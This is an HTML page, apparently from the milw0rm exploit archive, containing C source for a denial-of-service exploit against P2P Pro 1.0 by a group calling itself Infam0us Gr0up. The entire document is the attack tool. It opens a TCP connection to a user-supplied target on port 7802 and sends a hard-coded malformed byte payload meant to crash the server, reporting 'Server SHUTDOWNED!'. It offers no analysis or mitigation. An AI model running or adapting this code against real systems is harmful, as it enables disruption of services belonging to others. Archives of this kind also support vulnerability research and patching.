<html><head><title>P2P Pro 1.0 (command) Denial of Service Exploit</title></head><pre>/*
     P2P Pro Command DOS Exploit
 ------------------------------------
  Infam0us Gr0up - Securiti Research

 Info: infamous.2hell.com
 Vendor URL: http://www.digital-revolution.org/P2PPro.html

*/

#include string.h
#include winsock2.h 
#include stdio.h 

#pragma comment(lib, &quot;ws2_32.lib&quot;) 

char doscore[] = 
&quot;\x3f\x3f\xbc\x59\x70 &quot;
&quot;\x32\x70\x3f\xe1 &quot;
&quot;\x2b\x5c\x3f\xa6\xeb\xa6&quot;
&quot;\x50\x46\x2b\x5c\x3f\xa6\xeb\xa6&quot;
&quot;\x50\x4f\x57\x4e\x45\x44\x2e\x74&quot;
&quot;\x78\x74\x2b\x5c\x3f\xa6\xeb\xa6&quot;
&quot;\x50\x31\x32\x33\x32\x34\x32\x2e\x6b\x62&quot;;


int main(int argc, char *argv[]) 
{ 
WSADATA wsaData; 
WORD wVersionRequested; 
struct hostent *pTarget; 
struct sockaddr_in sock; 
char *target; 
int port,bufsize; 
SOCKET inetdos; 

if (argc &lt; 2) 
{ 
printf(&quot;        P2P Pro Command DOS Exploit \n&quot;, argv[0]);
printf(&quot;  --------------------------------------\n&quot;, argv[0]);
printf(&quot;    Infam0us Gr0up - Securiti Research\n\n&quot;, argv[0]);
printf(&quot;[-]Usage: %s [target] [port]\n&quot;, argv[0]); 
printf(&quot;[?]Exam: %s localhost 7802\n&quot;, argv[0]); 
exit(1); 
} 

wVersionRequested = MAKEWORD(1, 1); 
if (WSAStartup(wVersionRequested, &amp;wsaData) &lt; 0) return -1; 

target = argv[1]; 
port = 7802; 

if (argc &gt;= 3) port = atoi(argv[2]); 
bufsize = 1024; 
if (argc &gt;= 4) bufsize = atoi(argv[3]); 

inetdos = socket(AF_INET, SOCK_STREAM, 0); 
if(inetdos==INVALID_SOCKET) 
{ 
printf(&quot;Socket ERROR \n&quot;); 
exit(1); 
} 
printf(&quot;    P2P Pro Command DOS Exploit \n&quot;, argv[0]);
printf(&quot;  --------------------------------------\r\n\n&quot;, argv[0]);
printf(&quot;Resolve host... &quot;); 
if ((pTarget = gethostbyname(target)) == NULL) 
{ 
printf(&quot;FAILED \n&quot;, argv[0]); 
exit(1); 
} 
printf(&quot;[OK]\n &quot;);
memcpy(&amp;sock.sin_addr.s_addr, pTarget-&gt;h_addr, pTarget-&gt;h_length); 
sock.sin_family = AF_INET; 
sock.sin_port = htons((USHORT)port); 

printf(&quot;[+] Connecting... &quot;); 
if ( (connect(inetdos, (struct sockaddr *)&amp;sock, sizeof (sock) ))) 
{ 
printf(&quot;FAILED\n&quot;); 
exit(1); 
} 
printf(&quot;[OK]\n&quot;);
printf(&quot;Target listen.. \n&quot;); 
printf(&quot;Sending bad procedure... &quot;); 
if (send(inetdos, doscore, sizeof(doscore)-1, 0) == -1) 
{ 
printf(&quot;ERROR\n&quot;); 
closesocket(inetdos); 
exit(1); 
} 
printf(&quot;[OK]\n &quot;);
printf(&quot;[+] Server SHUTDOWNED!\n&quot;); 
closesocket(inetdos); 
WSACleanup(); 
return 0; 
}

// milw0rm.com [2005-09-02]</pre></html>